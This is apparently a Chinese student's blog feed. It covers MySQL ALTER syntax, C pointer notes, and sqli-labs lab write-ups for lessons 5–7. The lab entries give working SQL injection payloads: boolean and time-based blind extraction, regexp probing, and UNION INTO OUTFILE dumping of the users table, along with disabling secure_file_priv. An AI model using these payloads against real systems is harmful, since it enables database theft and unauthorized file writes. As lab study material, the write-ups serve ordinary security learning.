title="三.特殊的"></a>三.特殊的</h4><p>增加列：alter table 表名 add 列名 列值类型 约束；</p><p>将旧表的内容复制到新表：insert into less42 select *from users</p><p>附：MySQL增删改查语句学习资料<a href="https://www.iteye.com/blog/sakyone-365147">https://www.iteye.com/blog/sakyone-365147</a></p><h5 id="四-数据库alter的用法："><a href="#四-数据库alter的用法：" class="headerlink" title="四.数据库alter的用法："></a>四.数据库alter的用法：</h5><p>1：删除列</p><p>ALTER TABLE 【表名】 DROP 【列名】</p><p>2：增加列</p><p>ALTER TABLE 【表名】 ADD 【列名】 【类型】<br>alter table table1 add transactor varchar(10) not Null;</p><p>3：重命名列</p><p>ALTER TABLE 【表名】 CHANGE 【列名】【新名】 </p><p>4：修改表字段</p><p>alter table 表名称 change 字段名称 字段新名称 字段新类型 [是否允许非空];<br>alter table 表名称 modify 字段名称 字段新类型 [是否允许非空];</p><p>5：查询表的字段信息</p><p>desc 表名称;</p><p>6：创建索引</p><p>ALTER TABLE tbl_name ADD INDEX index_name (column list);</p><p>7：删除索引</p><p>ALTER TABLE tbl_name DROP INDEX index_name (column list);</p><p>8：修改表名</p><p>ALTER TABLE 表名 rename 新表名;</p><p>原文链接：<a href="https://blog.csdn.net/sinat_36053757/article/details/83380684">https://blog.csdn.net/sinat_36053757/article/details/83380684</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h4 id=&quot;一-MySQL的增删改查语句。&quot;&gt;&lt;a href=&quot;#一-MySQL的增删改查语句。&quot; class=&quot;headerlink&quot; title=&quot;一.MySQL的增</summary>
      
    
    
    
    
    <category term="数据库的增删改查" scheme="http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/"/>
    
  </entry>
  
  <entry>
    <title>第六章</title>
    <link href="http://example.com/2020/12/01/blog8/"/>
    <id>http://example.com/2020/12/01/blog8/</id>
    <published>2020-12-01T13:08:21.000Z</published>
    <updated>2021-01-30T14:55:02.879Z</updated>
    
    <content type="html"><![CDATA[<h4 id="一-指针与指针变量"><a href="#一-指针与指针变量" class="headerlink" title="一.指针与指针变量"></a>一.指针与指针变量</h4><p>1.指针就是变量的地址。</p><p>2.指针变量的定义：类型标识符   *标识符；如：int   *p。这句话将p定义为指针变量；p代表一个地址。</p><p>注：a.一个指针变量只能指向类型相同的变量。</p><p>​        b.如果存在“int i， *p=&amp;i（定义的p为指针变量的同时将i的地址赋值给p，指针变量p就指向了i，即 *p等价于i）；”。那么 *p等价于i等价于 *&amp;i；&amp; *p等价于&amp;i等价于p。观察发现指针运算符和取地址符共同作用时，会相互抵消。</p><h4 id="二-指针运算"><a href="#二-指针运算" class="headerlink" title="二.指针运算"></a>二.指针运算</h4><p>1.指针运算符“ * ”与自增，自减运算符均为单目运算，运算级相同，则运算方向为自右向东。</p><p>三.指针和二维数组</p><p>1.假设a为二维数组，a既是数组名也是二维数组的首地址，相当于a[0] [0]。a+1表示a[1] [0];*a+1表示a[0] [1]。</p><p>2.假设有程序语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int a[3] [5] , (*p)[5],i,j;</span><br><span class="line">p&#x3D;a;</span><br></pre></td></tr></table></figure><p>则存在以下等阶：<em>（p[i]+j)  等于 * (* (p+i)+j)   等于  (</em>(p+i ) )[j] 等于  p[i] [j] 等于  a[i] [j] 。</p><p>3.假设有程序语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int a[3] [5],i,j,*p[3];</span><br><span class="line">for (i&#x3D;0;i&lt;3;i++) p[i]&#x3D;a[i];&#x2F;&#x2F;p[i] 相当于每一行的首地址</span><br></pre></td></tr></table></figure><p>则存在以下等阶：*(p[i]+j) 等于 *( *(p+i)+j)  等于 ( *(p+i )) [ j ] 等于 p[i] [j] 等于 a[i] [j]。</p><h4 id="三-复合"><a href="#三-复合" class="headerlink" title="三.复合"></a>三.复合</h4><h5 id="1-指向指针的指针变量定义："><a href="#1-指向指针的指针变量定义：" class="headerlink" title="1.指向指针的指针变量定义："></a>1.指向指针的指针变量定义：</h5><p>语法格式：类型标识符   ** 指针变量名。    **指针变量名等阶于 *( *指针变量名)</p><h5 id="2-指向结构体数组的指针变量"><a href="#2-指向结构体数组的指针变量" class="headerlink" title="2.指向结构体数组的指针变量:"></a>2.指向结构体数组的指针变量:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">struct booktp</span><br><span class="line">&#123;</span><br><span class="line">char name[60];</span><br><span class="line">char author[30];</span><br><span class="line">float price;</span><br><span class="line">struct datetp</span><br><span class="line">&#123;</span><br><span class="line">unsigned year;</span><br><span class="line">unsigned month;</span><br><span class="line">&#125;pubday;</span><br><span class="line">&#125;;</span><br><span class="line">struct booktp *p,book[3];</span><br><span class="line">p&#x3D;book;&#x2F;&#x2F;p指向book的首地址，即book[0];</span><br><span class="line">且book[0].price &#x3D; p-&gt;price &#x3D; (*p).price</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;一-指针与指针变量&quot;&gt;&lt;a href=&quot;#一-指针与指针变量&quot; class=&quot;headerlink&quot; title=&quot;一.指针与指针变量&quot;&gt;&lt;/a&gt;一.指针与指针变量&lt;/h4&gt;&lt;p&gt;1.指针就是变量的地址。&lt;/p&gt;
&lt;p&gt;2.指针变量的定义：类型标识符   *标识符</summary>
      
    
    
    
    
    <category term="C语言学习" scheme="http://example.com/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>lesson7</title>
    <link href="http://example.com/2020/11/29/blog%20g/"/>
    <id>http://example.com/2020/11/29/blog%20g/</id>
    <published>2020-11-29T08:49:29.000Z</published>
    <updated>2021-01-30T14:47:10.344Z</updated>
    
    <content type="html"><![CDATA[<h4 id="一-预备"><a href="#一-预备" class="headerlink" title="一.预备"></a>一.预备</h4><p>1.利用load_flie()函数导出文件：</p><p>load_file(file_name):读取文件并返回该文件的内容作为一个字符串。 </p><p>注.使用条件：</p><p>a.必须有权限读取并且文件必须完全可读。当文件不存在或者没有权限访问时函数的返回值为空。</p><p>b.欲读取文件必须在服务器上。</p><p>c.必须指定文件完整的路径。</p><p>d.欲读取文件必须小于 max_allowed_packet。</p><h4 id="二-lesson7实战"><a href="#二-lesson7实战" class="headerlink" title="二.lesson7实战"></a>二.lesson7实战</h4><h5 id="A-查找注入点："><a href="#A-查找注入点：" class="headerlink" title="A.查找注入点："></a>A.查找注入点：</h5><p>查询源代码——</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * from users where id&#x3D;((&#39;$id&#39;)) limit 0,1&quot;;</span><br></pre></td></tr></table></figure><p>我们可以得知注入类型为：’))</p><p>构造语句——</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39;)) or 1&#x3D;1--+;</span><br></pre></td></tr></table></figure><p>返回正常。</p><h5 id="B1-数据库中导出文件"><a href="#B1-数据库中导出文件" class="headerlink" title="B1.数据库中导出文件"></a>B1.数据库中导出文件</h5><p>遇到问题：输入语句——</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;))union select 1,2,database() into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\1.txt&quot;--+</span><br></pre></td></tr></table></figure><p>在指定目录下未生成相应名为“1”的文件</p><p>由前人指点：mysql最初对文件的导入和导出有限制，因此应当先取消该限制</p><p>在mysql数据库中执行语句——</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure><p>发现本地value的值为NULL。NULL表示禁止。即禁止将产生的文件导入mysql目录下（注：如果这里value值有文件夹目录，则表示只允许该目录下文件。如果为空，则表示不限制目录。）</p><p>既然问题找到了，那就解决它——去掉导入目录的限制：在mysql配置文件my.ini中加入语句——</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure_file_priv &#x3D;</span><br></pre></td></tr></table></figure><p>然后重启mysql，在执行上述语句则在指定目录下找到指定文件。</p><p>由于我们刚刚没有规定产生的文件导出到哪里，因此在导出文件时要表明目录地址。</p><p>在mysql数据库中输入语句——</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *from users into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\1.txt&quot;;</span><br></pre></td></tr></table></figure><p>则可在指定目录下找到该文件，得到users的全部内容。（注文件一定要是导出目录下不存在的新名字文件）</p><h5 id="B2-在B1的操作之后就可以开始常规流程："><a href="#B2-在B1的操作之后就可以开始常规流程：" class="headerlink" title="B2.在B1的操作之后就可以开始常规流程："></a>B2.在B1的操作之后就可以开始常规流程：</h5><p>1.爆库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;))union select 1,2,database() into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\1.txt&quot;--+</span><br></pre></td></tr></table></figure><p>点开1.txt的文件可以发现里面包含数据库名</p><p>2.爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;))union select 1,2,table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\2.txt&quot;--+</span><br></pre></td></tr></table></figure><p>点开2.txt的文件可以发现里面包含库名为security下的所有表的表名</p><p>3.爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;))union select 1,2,column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\3.txt&quot;--+</span><br></pre></td></tr></table></figure><p>点开3.txt的文件可以发现里面包含库名为security下表名为usesr的列的所有列名</p><p>4.爆值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;))union select *from users into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\4.txt&quot;--+</span><br></pre></td></tr></table></figure><p>点开4.txt的文件可以发现里面包含库名为security下表名为usesr的所有数据值。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;一-预备&quot;&gt;&lt;a href=&quot;#一-预备&quot; class=&quot;headerlink&quot; title=&quot;一.预备&quot;&gt;&lt;/a&gt;一.预备&lt;/h4&gt;&lt;p&gt;1.利用load_flie()函数导出文件：&lt;/p&gt;
&lt;p&gt;load_file(file_name):读取文件并返回该文件的</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>MySQL</title>
    <link href="http://example.com/2020/11/28/blog%20f/"/>
    <id>http://example.com/2020/11/28/blog%20f/</id>
    <published>2020-11-28T14:35:29.000Z</published>
    <updated>2021-02-04T10:22:02.953Z</updated>
    
    <content type="html"><![CDATA[<p>一.基本的使用</p><p>1.查看有哪些数据库：show database；</p><p>2.调用security数据库：use security；</p><p>3.查看被调用的数据库中有哪些表名：show tables；</p><p>4.查看表的结构，如：desc  email；</p><p>5.查看表的内容：select *form 表名；</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一.基本的使用&lt;/p&gt;
&lt;p&gt;1.查看有哪些数据库：show database；&lt;/p&gt;
&lt;p&gt;2.调用security数据库：use security；&lt;/p&gt;
&lt;p&gt;3.查看被调用的数据库中有哪些表名：show tables；&lt;/p&gt;
&lt;p&gt;4.查看表的结构，如：des</summary>
      
    
    
    
    
    <category term="mysql数据库的使用" scheme="http://example.com/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>lesson5&amp;lesson6</title>
    <link href="http://example.com/2020/11/20/blog%20e/"/>
    <id>http://example.com/2020/11/20/blog%20e/</id>
    <published>2020-11-20T08:15:38.000Z</published>
    <updated>2021-03-10T10:53:34.540Z</updated>
    
    <content type="html"><![CDATA[<h1 id="lesson5"><a href="#lesson5" class="headerlink" title="lesson5"></a>lesson5</h1><h2 id="A-sql布尔盲注"><a href="#A-sql布尔盲注" class="headerlink" title="A.sql布尔盲注"></a>A.sql布尔盲注</h2><h4 id="一-寻找注入点"><a href="#一-寻找注入点" class="headerlink" title="一.寻找注入点"></a>一.寻找注入点</h4><p>输入?id=1返回正常；输入?id=1’返回报错；确认注入点：输入?id=0’ or 1=1–+，返回正常，说明此题‘为注入点。</p><h4 id="二-爆库（遇到挫折）"><a href="#二-爆库（遇到挫折）" class="headerlink" title="二.爆库（遇到挫折）"></a>二.爆库（遇到挫折）</h4><p>通过输入之前学过的爆库语句发现得到的返回值只有you are in，无法显示出数据库名。所以要学习一种新的注入方法：盲注。</p><h5 id="A-函数"><a href="#A-函数" class="headerlink" title="A.函数"></a>A.函数</h5><h6 id="left（）函数：left（a，b）即从左侧截取字符串a的前b位，例如left（database（），1），database（）显示数据库名称（为字符串），即译为截取数据库名称的第一位数。"><a href="#left（）函数：left（a，b）即从左侧截取字符串a的前b位，例如left（database（），1），database（）显示数据库名称（为字符串），即译为截取数据库名称的第一位数。" class="headerlink" title="left（）函数：left（a，b）即从左侧截取字符串a的前b位，例如left（database（），1），database（）显示数据库名称（为字符串），即译为截取数据库名称的第一位数。"></a>left（）函数：left（a，b）即从左侧截取字符串a的前b位，例如left（database（），1），database（）显示数据库名称（为字符串），即译为截取数据库名称的第一位数。</h6><h6 id="substr（）函数：substr-a-b-c-从-b-位置开始，截取字符串-a-的-c-长度，取到的值包括b位置对应字符本身。同mid（）函数。"><a href="#substr（）函数：substr-a-b-c-从-b-位置开始，截取字符串-a-的-c-长度，取到的值包括b位置对应字符本身。同mid（）函数。" class="headerlink" title="substr（）函数：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度，取到的值包括b位置对应字符本身。同mid（）函数。"></a>substr（）函数：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度，取到的值包括b位置对应字符本身。同mid（）函数。</h6><h6 id="ascii-函数：将某个字符转换-为-ascii-值-。同ord（）函数。"><a href="#ascii-函数：将某个字符转换-为-ascii-值-。同ord（）函数。" class="headerlink" title="ascii()函数：将某个字符转换 为 ascii 值 。同ord（）函数。"></a>ascii()函数：将某个字符转换 为 ascii 值 。同ord（）函数。</h6><h6 id="length（）函数：获取数据库长度。如-id-1’and-length-database-n–-当n的值等于数据库名称字符串长度时，返回正常，反之报错"><a href="#length（）函数：获取数据库长度。如-id-1’and-length-database-n–-当n的值等于数据库名称字符串长度时，返回正常，反之报错" class="headerlink" title="length（）函数：获取数据库长度。如?id=1’and length(database())=n–+当n的值等于数据库名称字符串长度时，返回正常，反之报错"></a>length（）函数：获取数据库长度。如?id=1’and length(database())=n–+当n的值等于数据库名称字符串长度时，返回正常，反之报错</h6><h5 id="B-猜测数据库名称"><a href="#B-猜测数据库名称" class="headerlink" title="B.猜测数据库名称"></a>B.猜测数据库名称</h5><h6 id="猜测数据库名称第一位–输入语句：-id-1‘and-left-database-1-gt-’a’–-，若返回正常，则说明数据库名称首字母大于a，反之则说明数据库首字母为a。然后使用二分法将a换成m，继续观察返回结果，重复使用二分法，直到可以确定出字母为止。"><a href="#猜测数据库名称第一位–输入语句：-id-1‘and-left-database-1-gt-’a’–-，若返回正常，则说明数据库名称首字母大于a，反之则说明数据库首字母为a。然后使用二分法将a换成m，继续观察返回结果，重复使用二分法，直到可以确定出字母为止。" class="headerlink" title="猜测数据库名称第一位–输入语句：?id=1‘and left(database(),1)&gt;’a’–+  ，若返回正常，则说明数据库名称首字母大于a，反之则说明数据库首字母为a。然后使用二分法将a换成m，继续观察返回结果，重复使用二分法，直到可以确定出字母为止。"></a>猜测数据库名称第一位–输入语句：?id=1‘and left(database(),1)&gt;’a’–+  ，若返回正常，则说明数据库名称首字母大于a，反之则说明数据库首字母为a。然后使用二分法将a换成m，继续观察返回结果，重复使用二分法，直到可以确定出字母为止。</h6><h6 id="猜测数据库名称第二位–输入语句-id-1’and-left-database-2-gt-’sa’–-若返回正常，则说明数据库名称第二位字母大于a，反之则说明数据库名称第二位字母为a。然后使用二分法将a换成m，继续观察返回结果，重复使用二分法，直到可以确定出字母为止。"><a href="#猜测数据库名称第二位–输入语句-id-1’and-left-database-2-gt-’sa’–-若返回正常，则说明数据库名称第二位字母大于a，反之则说明数据库名称第二位字母为a。然后使用二分法将a换成m，继续观察返回结果，重复使用二分法，直到可以确定出字母为止。" class="headerlink" title="猜测数据库名称第二位–输入语句?id=1’and left(database(),2)&gt;’sa’–+ ,若返回正常，则说明数据库名称第二位字母大于a，反之则说明数据库名称第二位字母为a。然后使用二分法将a换成m，继续观察返回结果，重复使用二分法，直到可以确定出字母为止。"></a>猜测数据库名称第二位–输入语句?id=1’and left(database(),2)&gt;’sa’–+ ,若返回正常，则说明数据库名称第二位字母大于a，反之则说明数据库名称第二位字母为a。然后使用二分法将a换成m，继续观察返回结果，重复使用二分法，直到可以确定出字母为止。</h6><h6 id="猜测后续字母值同上，重复使用语句即可获得数据库名称“security”。"><a href="#猜测后续字母值同上，重复使用语句即可获得数据库名称“security”。" class="headerlink" title="猜测后续字母值同上，重复使用语句即可获得数据库名称“security”。"></a>猜测后续字母值同上，重复使用语句即可获得数据库名称“security”。</h6><h4 id="三-爆表"><a href="#三-爆表" class="headerlink" title="三.爆表"></a>三.爆表</h4><h5 id="！首先要先了解一下ascii码表，用于构建注入语句。"><a href="#！首先要先了解一下ascii码表，用于构建注入语句。" class="headerlink" title="！首先要先了解一下ascii码表，用于构建注入语句。"></a>！首先要先了解一下ascii码表，用于构建注入语句。</h5><h6 id="a-爆第一个表：输入语句-id-1‘and-ascii-substr-select-table-name-from-information-schema-tables-where-table-schema-database-limit-0-1）-1，1-gt-65-–-。"><a href="#a-爆第一个表：输入语句-id-1‘and-ascii-substr-select-table-name-from-information-schema-tables-where-table-schema-database-limit-0-1）-1，1-gt-65-–-。" class="headerlink" title="a.爆第一个表：输入语句?id=1‘and ascii(substr((select table_name  from information_schema.tables where table_schema=database() limit 0,1）,1，1)) &gt;65 –+ 。"></a>a.爆第一个表：输入语句?id=1‘and ascii(substr((select table_name  from information_schema.tables where table_schema=database() limit 0,1）,1，1)) &gt;65 –+ 。</h6><h6 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h6><h6 id="1-limit-0-1的意思是从第1行开始，获取这一行的返回值。而此处的意思是获取数据库的第一个表的表名。-substr-select-table-name-from-information-schema-tables-where-table-schema-database-limit-0-1）-即获取数据库的第一个表的表名。其在substr（a，b，c）中充当a的值。"><a href="#1-limit-0-1的意思是从第1行开始，获取这一行的返回值。而此处的意思是获取数据库的第一个表的表名。-substr-select-table-name-from-information-schema-tables-where-table-schema-database-limit-0-1）-即获取数据库的第一个表的表名。其在substr（a，b，c）中充当a的值。" class="headerlink" title="1.limit 0,1的意思是从第1行开始，获取这一行的返回值。而此处的意思是获取数据库的第一个表的表名。{substr((select table_name  from information_schema.tables where table_schema=database() limit 0,1）}即获取数据库的第一个表的表名。其在substr（a，b，c）中充当a的值。"></a>1.limit 0,1的意思是从第1行开始，获取这一行的返回值。而此处的意思是获取数据库的第一个表的表名。{substr((select table_name  from information_schema.tables where table_schema=database() limit 0,1）}即获取数据库的第一个表的表名。其在substr（a，b，c）中充当a的值。</h6><h6 id="2-整个输入语句的意图是：通过ascii码转换，猜测数据库的第一个表表名的首字母。为了猜测得到表名第二位字母，仅需将substr（a-b-c-中的1改为2。后续字母以此类推，可得数据库第一个表的表名。"><a href="#2-整个输入语句的意图是：通过ascii码转换，猜测数据库的第一个表表名的首字母。为了猜测得到表名第二位字母，仅需将substr（a-b-c-中的1改为2。后续字母以此类推，可得数据库第一个表的表名。" class="headerlink" title="2.整个输入语句的意图是：通过ascii码转换，猜测数据库的第一个表表名的首字母。为了猜测得到表名第二位字母，仅需将substr（a,b,c)中的1改为2。后续字母以此类推，可得数据库第一个表的表名。"></a>2.整个输入语句的意图是：通过ascii码转换，猜测数据库的第一个表表名的首字母。为了猜测得到表名第二位字母，仅需将substr（a,b,c)中的1改为2。后续字母以此类推，可得数据库第一个表的表名。</h6><h6 id="3-猜测的过程同样采用二分法。"><a href="#3-猜测的过程同样采用二分法。" class="headerlink" title="3.猜测的过程同样采用二分法。"></a>3.猜测的过程同样采用二分法。</h6><h6 id="b-爆第二个表：仅需把a中输入语句的limit-0-1改成limit-1-1。其余照部就搬。"><a href="#b-爆第二个表：仅需把a中输入语句的limit-0-1改成limit-1-1。其余照部就搬。" class="headerlink" title="b.爆第二个表：仅需把a中输入语句的limit 0,1改成limit 1,1。其余照部就搬。"></a>b.爆第二个表：仅需把a中输入语句的limit 0,1改成limit 1,1。其余照部就搬。</h6><h4 id="四-爆列"><a href="#四-爆列" class="headerlink" title="四.爆列"></a>四.爆列</h4><h6 id="如猜测users表中是否存在username列，输入语句：-id-1’-and-1-select-1-from-information-schema-columns-where-table-name-’users’-and-column-name-regexp-‘-username’-limit-0-1-–-返回正常，则说明users表中存在username列。"><a href="#如猜测users表中是否存在username列，输入语句：-id-1’-and-1-select-1-from-information-schema-columns-where-table-name-’users’-and-column-name-regexp-‘-username’-limit-0-1-–-返回正常，则说明users表中存在username列。" class="headerlink" title="如猜测users表中是否存在username列，输入语句：?id=1’ and 1=(select 1 from information_schema.columns where table_name=’users’ and column_name regexp ‘^username’ limit 0,1)–+返回正常，则说明users表中存在username列。"></a>如猜测users表中是否存在username列，输入语句：?id=1’ and 1=(select 1 from information_schema.columns where table_name=’users’ and column_name regexp ‘^username’ limit 0,1)–+返回正常，则说明users表中存在username列。</h6><h6 id="证明其他列是否存在也可用上述方法，仅需变换列名。"><a href="#证明其他列是否存在也可用上述方法，仅需变换列名。" class="headerlink" title="证明其他列是否存在也可用上述方法，仅需变换列名。"></a>证明其他列是否存在也可用上述方法，仅需变换列名。</h6><h4 id="五-爆值"><a href="#五-爆值" class="headerlink" title="五.爆值"></a>五.爆值</h4><h6 id="如输入语句-id-1’-and-ord-mid-select-ifunll-cast-username-as-char-0x20-form-security-users-order-by-id-limit-0-1-1-1-68–-。意思是获取username列中第一行的第一个字符的对应ascii码的数值与68比较，以确认其值。其余操作都是按部就搬上面。"><a href="#如输入语句-id-1’-and-ord-mid-select-ifunll-cast-username-as-char-0x20-form-security-users-order-by-id-limit-0-1-1-1-68–-。意思是获取username列中第一行的第一个字符的对应ascii码的数值与68比较，以确认其值。其余操作都是按部就搬上面。" class="headerlink" title="如输入语句?id=1’ and ord mid((select  ifunll(cast(username as char),0x20)form  security.users order by id limit 0,1),1,1))=68–+ 。意思是获取username列中第一行的第一个字符的对应ascii码的数值与68比较，以确认其值。其余操作都是按部就搬上面。"></a>如输入语句?id=1’ and ord mid((select  ifunll(cast(username as char),0x20)form  security.users order by id limit 0,1),1,1))=68–+ 。意思是获取username列中第一行的第一个字符的对应ascii码的数值与68比较，以确认其值。其余操作都是按部就搬上面。</h6><h2 id="B-sql报错注入"><a href="#B-sql报错注入" class="headerlink" title="B.*sql报错注入"></a>B.*sql报错注入</h2><h2 id="C-sql延时注入"><a href="#C-sql延时注入" class="headerlink" title="C.*sql延时注入"></a>C.*sql延时注入</h2><h6 id="预备：时间盲注多与if（expr1-expr2-expr3）结合使用，此if语句的用法是：如果expr1是true，则if（）的返回值为expr2；否则返回expr3"><a href="#预备：时间盲注多与if（expr1-expr2-expr3）结合使用，此if语句的用法是：如果expr1是true，则if（）的返回值为expr2；否则返回expr3" class="headerlink" title="预备：时间盲注多与if（expr1,expr2,expr3）结合使用，此if语句的用法是：如果expr1是true，则if（）的返回值为expr2；否则返回expr3."></a><em>预备：</em>时间盲注多与if（expr1,expr2,expr3）结合使用，此if语句的用法是：如果expr1是true，则if（）的返回值为expr2；否则返回expr3.</h6><p>关于sleep函数：<a href="https://blog.csdn.net/zyz511919766/article/details/42241211">https://blog.csdn.net/zyz511919766/article/details/42241211</a></p><h6 id="1-利用sleep（）函数进行注入：-id-1’and-If-ascii-substr-database-1-1-115-1-sleep-5-–-当错误的时候网页会有五秒的延迟。"><a href="#1-利用sleep（）函数进行注入：-id-1’and-If-ascii-substr-database-1-1-115-1-sleep-5-–-当错误的时候网页会有五秒的延迟。" class="headerlink" title="1.利用sleep（）函数进行注入：?id=1’and If(ascii(substr(database(),1,1))=115,1,sleep(5))–+当错误的时候网页会有五秒的延迟。"></a>1.利用sleep（）函数进行注入：?id=1’and If(ascii(substr(database(),1,1))=115,1,sleep(5))–+当错误的时候网页会有五秒的延迟。</h6><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><h6 id="在本题学习时学习了sql盲注之正则表达式攻击。我们可以使用正则表达式攻击法获得表名或列名。"><a href="#在本题学习时学习了sql盲注之正则表达式攻击。我们可以使用正则表达式攻击法获得表名或列名。" class="headerlink" title="在本题学习时学习了sql盲注之正则表达式攻击。我们可以使用正则表达式攻击法获得表名或列名。"></a>在本题学习时学习了sql盲注之正则表达式攻击。我们可以使用正则表达式攻击法获得表名或列名。</h6><h6 id="1-如判断第一个表名的第一个字符是否是a-z中的字符，输入语句：-id-1’-and-1-select-1-from-information-schema-tables-where-table-name-’security’-and-table-name-regexp-‘-a-z-’-limit-0-1-–"><a href="#1-如判断第一个表名的第一个字符是否是a-z中的字符，输入语句：-id-1’-and-1-select-1-from-information-schema-tables-where-table-name-’security’-and-table-name-regexp-‘-a-z-’-limit-0-1-–" class="headerlink" title="1.如判断第一个表名的第一个字符是否是a-z中的字符，输入语句：?id=1’ and 1=(select 1 from information_schema.tables where table_name=’security’ and table_name regexp ‘^[a-z]’ limit 0,1)–+"></a>1.如判断第一个表名的第一个字符是否是a-z中的字符，输入语句：?id=1’ and 1=(select 1 from information_schema.tables where table_name=’security’ and table_name regexp ‘^[a-z]’ limit 0,1)–+</h6><h6 id="2-如判断第一个字符是否是a-n中的字符，输入语句：-id-1’-and-1-select-1-from-information-schema-tables-where-table-name-’security’-and-table-name-regexp-‘-a-n-’-limit-0-1-–"><a href="#2-如判断第一个字符是否是a-n中的字符，输入语句：-id-1’-and-1-select-1-from-information-schema-tables-where-table-name-’security’-and-table-name-regexp-‘-a-n-’-limit-0-1-–" class="headerlink" title="2.如判断第一个字符是否是a-n中的字符，输入语句：?id=1’ and 1=(select 1 from       information_schema.tables where table_name=’security’ and table_name regexp ‘^[a-n]’ limit 0,1)–+"></a>2.如判断第一个字符是否是a-n中的字符，输入语句：?id=1’ and 1=(select 1 from       information_schema.tables where table_name=’security’ and table_name regexp ‘^[a-n]’ limit 0,1)–+</h6><h6 id="3-如确定一个数是n：-id-1’-and-1-select-1-from-information-schema-tables-where-table-name-’security’-and-table-name-regexp-‘-n’-limit-0-1-–"><a href="#3-如确定一个数是n：-id-1’-and-1-select-1-from-information-schema-tables-where-table-name-’security’-and-table-name-regexp-‘-n’-limit-0-1-–" class="headerlink" title="3.如确定一个数是n：?id=1’ and 1=(select 1 from  information_schema.tables where table_name=’security’ and table_name regexp ‘^n’ limit 0,1)–+"></a>3.如确定一个数是n：?id=1’ and 1=(select 1 from  information_schema.tables where table_name=’security’ and table_name regexp ‘^n’ limit 0,1)–+</h6><h6 id="4-自己在后续的做题时发现布尔盲注法用起来很鸡肋，因为如果页面一直回显给你you-are-in那么你就无法确定注入语句是否正确。"><a href="#4-自己在后续的做题时发现布尔盲注法用起来很鸡肋，因为如果页面一直回显给你you-are-in那么你就无法确定注入语句是否正确。" class="headerlink" title="4.自己在后续的做题时发现布尔盲注法用起来很鸡肋，因为如果页面一直回显给你you are in那么你就无法确定注入语句是否正确。"></a>4.自己在后续的做题时发现布尔盲注法用起来很鸡肋，因为如果页面一直回显给你you are in那么你就无法确定注入语句是否正确。</h6><h1 id="lesson6"><a href="#lesson6" class="headerlink" title="lesson6"></a>lesson6</h1><p>由题目可知：这是双注入双引号型。我们通过查找源代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id &#x3D; &#39;&quot;&#39;.$id.&#39;&quot;&#39;;</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>易知本题的注入点仅需把lesson5的注入点 ‘ 改为 “ 即可，其余按部就班。</p>]]></content>
    
    
      
      
